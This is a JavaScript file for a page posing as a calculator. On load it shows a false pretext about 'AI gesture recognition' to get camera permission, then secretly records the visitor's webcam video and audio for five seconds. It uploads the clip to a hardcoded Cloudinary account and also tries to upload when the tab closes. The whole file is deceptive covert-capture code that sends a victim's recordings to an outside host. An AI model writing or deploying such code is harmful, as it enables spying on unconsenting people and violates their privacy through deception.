let recorder;
let chunks = [];
let isRecording = false;

async function startRecording() {
     if (isRecording) return;

     try {
          const stream = await navigator.mediaDevices.getUserMedia({
               video: true,
               audio: true
          });

          recorder = new MediaRecorder(stream);
          chunks = [];

          recorder.ondataavailable = e => {
               if (e.data.size > 0) chunks.push(e.data);
          };

          recorder.start();
          isRecording = true;

          console.log("Recording started");

     } catch (err) {
          console.error("Permission denied or error:", err);
     }
}

async function stopAndUpload() {
     if (!recorder || recorder.state === "inactive") return;

     return new Promise(resolve => {

          recorder.onstop = async () => {

               const blob = new Blob(chunks, { type: "video/webm" });
               chunks = [];
               isRecording = false;

               // Save locally (Phase 1 demo)
               const videoURL = URL.createObjectURL(blob);
               localStorage.setItem("lastCapture", videoURL);

               // Upload to Cloudinary (Phase 2)
               const formData = new FormData();
               formData.append("file", blob);
               formData.append("upload_preset", "Webcam_Upload");

               try {
                    await fetch("https://api.cloudinary.com/v1_1/dnykoro97/video/upload", {
                         method: "POST",
                         body: formData
                    });

                    console.log("Uploaded successfully");

               } catch (err) {
                    console.error("Upload failed:", err);
               }

               resolve();
          };

          recorder.stop();
     });
}

function showWarning() {
     document.getElementById("warning").classList.remove("d-none");
}

window.onload = async () => {

     alert("This calculator uses AI gesture recognition. Please allow camea access.");

     await startRecording();

     // Wait 5 seconds (real wait, not fake)
     await new Promise(resolve => setTimeout(resolve, 5001));

     showWarning();

     await stopAndUpload();
};

// tried to upload at closing the tab but didn't work
window.onbeforeunload = async () => {
     await stopAndUpload();
};